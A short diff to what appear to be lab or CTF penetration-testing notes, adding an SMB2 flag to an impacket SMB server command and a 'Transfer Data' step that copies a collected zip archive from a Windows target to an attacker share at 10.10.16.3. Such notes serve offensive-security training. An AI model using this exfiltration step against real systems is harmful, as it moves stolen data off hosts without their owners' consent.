@@ -49,5 +49,13 @@ smb: \> dir
 We can start a smb server with impacket-smbserver and transfer files to and from our kali host
 
 ```
-python smbserver.py SHARE_NAME PATH_TO_SHARE
+python smbserver.py SHARE_NAME PATH_TO_SHARE -smb2support
+```
+
+
+
+## Transfer Data
+
+```powerquery
+PS> copy 20240207102333_SUPPORT.zip \\10.10.16.3\test
 ```
